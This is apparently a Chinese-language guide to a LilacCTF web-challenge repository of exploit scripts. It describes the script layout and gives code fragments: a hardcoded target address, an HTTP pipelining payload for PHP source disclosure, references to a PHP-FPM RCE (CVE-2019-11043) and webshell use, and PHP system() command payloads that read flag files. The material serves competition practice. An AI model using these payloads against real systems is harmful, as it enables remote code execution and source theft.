# CTF Web 安全漏洞利用脚本指南

## 项目概述

这是 LilacCTF 比赛的 Web 安全挑战解题仓库，包含针对 PHP 应用的漏洞探测和利用脚本。

## 代码库结构

```
├── scan*.py / full_*.py    # 漏洞扫描与信息收集
├── exploit.py / exp.py     # 漏洞利用脚本
├── cve_exploit.py          # CVE 漏洞利用 (如 CVE-2019-11043)
├── php_*.py                # PHP 特定漏洞利用
├── get_flag.py / getflag.py # Flag 获取脚本
├── execute_webshell.py     # Webshell 利用
└── url_bypass.py           # URL/路径绕过技术
```

## 核心模式与约定

### 1. 目标配置模式
所有脚本顶部定义全局变量 `host`/`port` 或 `target` URL：
```python
host = '61.147.171.35'
port = 51810
# 或
target = "http://61.147.171.35:51810"
```

### 2. HTTP 请求模式

**高层请求** - 使用 `requests` 库处理标准 HTTP：
```python
r = requests.post(url, data={'admin': cmd})
r = requests.get(url, timeout=5)
```

**底层 socket** - 用于 HTTP 协议漏洞（如 pipelining、smuggling）：
```python
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(10)
sock.connect((host, port))
sock.send(payload.encode())
```

### 3. PHP 源码泄露漏洞模式
利用 HTTP pipelining 触发 PHP 开发服务器漏洞：
```python
payload = (
    f'GET /{target_file} HTTP/1.1\r\n'
    f'Host: {host}\r\n'
    '\r\n'
    'GET /xyz.xyz HTTP/1.1\r\n'  # 非 PHP 扩展名触发漏洞
    '\r\n'
)
```

### 4. 命令执行 Payload 模式
通过 POST 参数传递 PHP 代码执行系统命令：
```python
commands = [
    'system("id");',
    'system("cat /flag*");',
    'system("find / -name flag* 2>/dev/null");',
]
r = requests.post(url, data={'admin': cmd})
```

## 关键漏洞技术

| 文件 | 漏洞类型 | 核心技术 |
|------|---------|---------|
| `php_source_disclosure.py` | PHP 源码泄露 | HTTP Pipelining |
| `cve_exploit.py` | PHP-FPM RCE | CVE-2019-11043 |
| `url_bypass.py` | 路径/扩展名绕过 | NTFS ADS, 编码变形 |
| `execute_webshell.py` | Webshell 利用 | POST 数据保留 |

## 开发工作流

1. **新漏洞探测**: 复制 `scan.py` 模板，修改目标和扫描路径
2. **新利用脚本**: 复制 `exp.py` 模板，保持 `host`/`port` 配置模式
3. **测试**: 直接 `python script.py` 运行，观察控制台输出

## 注意事项

- 响应超时设置为 3-10 秒（`sock.settimeout()`/`timeout=`）
- 检测成功标志: 响应中包含 `uid=`、`<?php`、`flag{` 等
- 所有脚本面向单个目标服务器，无需命令行参数
